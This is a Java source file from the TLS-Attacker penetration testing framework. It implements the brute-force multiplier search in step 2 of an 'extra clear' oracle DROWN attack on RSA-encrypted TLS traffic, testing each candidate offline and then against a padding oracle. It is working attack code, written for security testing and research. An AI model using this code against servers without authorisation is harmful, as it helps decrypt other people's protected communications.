/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2021 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsattacker.attacks.impl.drown;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.attacks.pkcs1.oracles.ExtraClearDrownOracle;
import java.math.BigInteger;
import java.util.concurrent.Callable;

/**
 * Callable implementing the brute-force part of step 2 of an "extra clear" oracle DROWN attack: Finding a suitable
 * multiplier s and testing it both offline and using the oracle, as described in appendix A.3 of the DROWN paper.
 */
class ExtraClearStep2Callable implements Callable<BigInteger> {

    private ExtraClearDrownOracle oracle;
    private byte[] shiftedOldCiphertext;
    private int lenM;
    private BigInteger rsaE;
    private BigInteger modulus;
    private BigInteger candidateS;
    private BigInteger candidateStepS;
    private BigInteger maxS;
    private BigInteger shiftedOldPlaintext;

    public ExtraClearStep2Callable(ExtraClearDrownOracle oracle, byte[] shiftedOldCiphertext, int lenM, BigInteger e,
        BigInteger modulus, BigInteger initialSCandidate, BigInteger candidateStepS, BigInteger shiftedOldPlaintext) {
        this.oracle = oracle;
        this.shiftedOldCiphertext = shiftedOldCiphertext;
        this.lenM = lenM;
        this.rsaE = e;
        this.modulus = modulus;
        this.candidateS = initialSCandidate;
        this.candidateStepS = candidateStepS;
        this.shiftedOldPlaintext = shiftedOldPlaintext;

        maxS = BigInteger.valueOf(2).modPow(BigInteger.valueOf(30), modulus);
    }

    @Override
    public BigInteger call() {
        while (candidateS.compareTo(maxS) <= 0) {
            // Offline part: Find a suitable s without querying the oracle
            // Appendix A.3 of the DROWN paper describes a way to speed this
            // up using lattices, but I don't know enough about lattices :-(
            byte[] plaintextCandidate;
            do {
                if (Thread.currentThread().isInterrupted()) {
                    return null;
                }

                candidateS = candidateS.add(candidateStepS);
                plaintextCandidate = ArrayConverter
                    .bigIntegerToByteArray(shiftedOldPlaintext.multiply(candidateS).mod(modulus), lenM, false);
            } while ((plaintextCandidate.length > lenM) || (plaintextCandidate[0] != 0x00)
                || (plaintextCandidate[1] != 0x02));

            // Online part: Check if s is really suitable using the oracle
            byte[] ciphertextCandidate = ArrayConverter.bigIntegerToByteArray(
                candidateS.modPow(rsaE, modulus).multiply(new BigInteger(shiftedOldCiphertext)).mod(modulus), lenM,
                true);
            if (oracle.checkPKCSConformity(ciphertextCandidate)) {
                return candidateS;
            }
        }
        return null;
    }

}
